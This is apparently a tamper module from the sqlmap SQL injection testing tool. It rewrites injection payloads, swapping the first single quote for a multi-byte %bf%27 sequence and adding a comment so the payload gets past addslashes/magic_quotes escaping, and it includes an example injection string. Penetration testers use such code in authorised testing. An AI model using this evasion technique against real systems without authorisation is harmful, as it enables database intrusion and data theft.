#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, headers=None):
    """
    Replaces quote character (') with a multi-byte combo %bf%27 together with
    generic comment at the end (to make it work)

    Example:
        * Input: 1' AND 1=1
        * Output: 1%bf%27 AND 1=1--%20

    Notes:
        * Useful for bypassing magic_quotes/addslashes feature

    Reference:
        * http://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string
    """

    retVal = payload

    if payload:
        found = False
        retVal = ""

        for i in xrange(len(payload)):
            if payload[i] == '\'' and not found:
                retVal += "%bf%27"
                found = True
            else:
                retVal += payload[i]
                continue

        if found:
            retVal = re.sub("\s*(AND|OR)[\s(]+'[^']+'\s*(=|LIKE)\s*'.*", "", retVal)
            retVal += "-- "

    return retVal
